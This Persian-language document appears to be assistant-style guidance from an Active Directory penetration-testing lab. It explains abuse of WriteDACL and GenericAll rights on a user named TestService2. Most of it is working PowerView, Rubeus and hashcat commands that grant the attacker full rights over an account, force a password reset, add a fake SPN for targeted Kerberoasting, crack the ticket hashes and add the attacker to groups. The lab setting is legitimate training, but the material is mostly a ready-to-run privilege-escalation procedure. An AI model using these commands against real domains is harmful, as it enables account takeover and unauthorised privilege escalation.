

**WriteDACL چیه:**
یعنی می‌تونی ACL یه آبجکت رو تغییر بدی. به عبارت دیگه، می‌تونی به خودت (یا هر کس دیگه‌ای) دسترسی‌های دلخواه روی اون آبجکت بدی.

**سناریوی معمول:**
فرض کن یوزر فعلی تو (`offsec`) روی یه یوزر دیگه (مثلاً `targetuser`) WriteDACL داره. می‌تونی به خودت `GenericAll` بدی و بعد همون کارهای قبلی رو انجام بدی.

---

## **مراحل Abuse:**

### **1. پیدا کردن WriteDACL:**
```powershell
Get-ObjectACL -Identity targetuser -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteDacl"}
```

### **2. دادن GenericAll به خودت:**
```powershell
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity offsec -Rights All
```

### **3. حالا GenericAll داری، می‌تونی:**
- **پسورد رو عوض کنی:**
  ```powershell
  Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
  ```

- **یا SPN اضافه کنی برای Kerberoasting:**
  ```powershell
  Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='http/fake'}
  Get-DomainUser targetuser | Get-DomainSPNTicket | fl
  ```

---

## **روی Group:**
اگه WriteDACL روی یه گروپ داری:
```powershell
Add-DomainObjectAcl -TargetIdentity TestGroup -PrincipalIdentity offsec -Rights All
Add-DomainGroupMember -Identity TestGroup -Members offsec

---

**نکته مهم:** WriteDACL خودش مستقیماً کاری نمی‌کنه، ولی بهت اجازه می‌ده هر دسترسی دیگه‌ای رو به خودت بدی.

داری روی چه آبجکتی WriteDACL پیدا کردی؟
```


**تحلیل خروجی:**

این بار یه **User Object** پیدا کردی به اسم `TestService2` که یوزر فعلی تو (`PROD\offsec`) روی اون `GenericAll` داره.

**ObjectDN:** `CN=TestService2,OU=prodUsers,DC=prod,DC=corp1,DC=com`  
**ActiveDirectoryRights:** `GenericAll`  
**Identity:** `PROD\offsec`

---

## **گزینه‌های Abuse:**

### **1. تغییر پسورد (سریع‌ترین راه):**
```powershell
Set-DomainUserPassword -Identity TestService2 -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
```
بعدش می‌تونی با پسورد جدید لاگین کنی:
```powershell
runas /user:PROD\TestService2 cmd
```

---

### **2. Targeted Kerberoasting (اگه پسورد ضعیف داشته باشه):**
```powershell
# اضافه کردن SPN
Set-DomainObject -Identity TestService2 -Set @{serviceprincipalname='http/fake'}

# گرفتن تیکت
Get-DomainUser TestService2 | Get-DomainSPNTicket | fl

# یا با Rubeus
.\Rubeus.exe kerberoast /user:TestService2 /nowrap

# کرک کردن
hashcat -m 13100 hash.txt wordlist.txt

# پاک‌سازی
Set-DomainObject -Identity TestService2 -Clear serviceprincipalname
```

---

### **3. چک کردن اطلاعات یوزر:**
```powershell
Get-DomainUser -Identity TestService2 | select samaccountname,memberof,serviceprincipalname
```
ببین این یوزر عضو چه گروه‌هایی هست یا قبلاً SPN داره یا نه.

---

